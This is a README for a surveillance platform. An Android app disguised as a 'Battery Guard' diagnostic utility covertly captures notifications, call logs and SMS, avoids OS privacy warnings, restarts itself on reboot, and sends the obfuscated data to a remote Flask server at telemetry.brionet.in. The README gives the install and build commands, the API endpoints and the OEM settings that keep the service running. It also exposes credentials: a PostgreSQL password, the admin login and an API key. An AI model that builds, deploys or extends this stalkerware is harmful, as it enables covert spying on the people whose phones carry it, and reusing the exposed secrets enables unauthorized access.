# Battery Guard & DevicePulse Telemetry Platform

## Overview

A robust, stealthy device monitoring and telemetry architecture comprising:
1. **`battery-guard-android`**: Disguised Android utility app (*"Battery Guard"*) that passively captures notifications, call logs, SMS metadata, battery/device health stats, and 5-minute heartbeat pings without generating privacy alerts or OS warnings.
2. **`telemetry-server`**: High-performance Flask web console and REST API deployed in k3s, persisting to PostgreSQL and exposed securely over Cloudflare Tunnel (`https://telemetry.brionet.in`).
3. **`k3s/telemetry-server`**: Production Kubernetes deployment manifests, secrets, PVCs, and automated deployment script (`deploy_telemetry.sh`).

---

## 1. Architecture & Network Flow

```
[Android Phone (Cellular 4G/5G or any Wi-Fi)]
                    │
                    ▼ (Public HTTPS + Base64 Obfuscated Payloads)
       https://telemetry.brionet.in
                    │
                    ▼ (Cloudflare Tunnel: cloudflared)
     [k3s Cluster: telemetry-server pod]
                    │
                    ▼ (Internal Tailscale IP)
  [PostgreSQL: postgresql://postgres:postgres@100.69.32.37:5432/telemetry]
```

- **Client-to-Server:** Public HTTPS via Cloudflare edge. Requires no VPN or custom network configuration on monitored devices.
- **Server-to-Database:** Private connection within Tailscale mesh (`100.69.32.37:5432`).

---

## 2. Telemetry Web Console & Server

- **URL:** [`https://telemetry.brionet.in`](https://telemetry.brionet.in)
- **Dashboard:** [`https://telemetry.brionet.in/dashboard`](https://telemetry.brionet.in/dashboard)
- **Web Credentials:** `admin` / `adminpassword`
- **Ingestion API Key:** `efe9c3beb035fe82111084cbb181e6f9` (Passed via `X-API-Key` header)

### API Endpoints
- `POST /api/v1/ping`: Receives 5-minute device health heartbeat (battery %, temperature, RAM %, storage %, uptime, GPS state, recent app logs).
- `POST /api/v1/sync`: Ingests batches of captured notifications, call logs, and SMS messages (Base64 decoded on receipt before SQL insert).
- `GET /dashboard`: Main overview table with live auto-refresh, device status, and diagnostic log viewer.
- `GET /dashboard/notifications`: Browse and filter captured notifications by app or device.
- `GET /dashboard/calls`: Browse call history (incoming, outgoing, missed, duration).
- `GET /dashboard/sms`: Browse inbound and outbound SMS messages.

### Deployment Commands
To deploy or update the server in k3s:
```bash
/Users/om/Documents/workspaces/cf/k3s/telemetry-server/deploy_telemetry.sh
```

---

## 3. Android Client (`battery-guard-android`)

### Key Components & Features
- **Disguise UI (`MainActivity` / `SetupActivity`):** Clean 4-step "Battery Diagnostic" wizard. Zero server configuration or telemetry references exposed in the UI.
- **5-Minute Heartbeat (`MonitorForegroundService`):** Periodic heartbeat ping updating live battery %, charging state, temperature, RAM %, storage %, and uptime.
- **Dynamic Device Info (`DeviceInfoHelper`):** Queries `Settings.Global.device_name` and `Build.MANUFACTURER` + `Build.MODEL` to automatically register marketing device names (e.g. *Tecno POVA Neo*, *Poco X6*).
- **Passive GPS Detection (`GpsStateReceiver`):** Listens to `PROVIDERS_CHANGED` broadcast to log GPS ON/OFF state without querying coordinates (prevents green status bar dot and background location warnings).
- **Remote Diagnostic Logger (`AppLogger`):** In-memory ring buffer of the last 50 app events attached to heartbeat pings, viewable via the **`📋 View Logs`** button on the web console.
- **Auto-Restart on Reboot (`BootReceiver` + `START_STICKY`):** Restarts the background service and schedules sync workers automatically upon device boot.
- **Local Data Obfuscation (`EncodingUtils`):** Base64 encodes sensitive notification and telephony fields before writing to the local Room database (`monitor.db`).

### APK Location & Installation
- **Binary Path:** `battery-guard-android/app/build/outputs/apk/debug/app-debug.apk`

**Install via ADB:**
```bash
/Users/om/Library/Android/sdk/platform-tools/adb install -r -d -g /Users/om/Documents/workspaces/cf/battery-guard-android/app/build/outputs/apk/debug/app-debug.apk
```

**Build Commands:**
```bash
cd /Users/om/Documents/workspaces/cf/battery-guard-android
./gradlew testDebugUnitTest assembleDebug
```

---

## 4. OEM Configuration Guide (Xiaomi / Poco / Tecno)

To prevent aggressive OEM battery managers from sleeping background services:
1. **Autostart:** Enable **Autostart** in `Settings -> Apps -> Battery Guard -> Autostart`.
2. **Battery Optimization:** Set Battery Saver to **"No restrictions"**.
3. **Notification Access:** Ensure **Battery Guard** is toggled ON under `Settings -> Special app access -> Notification access`.
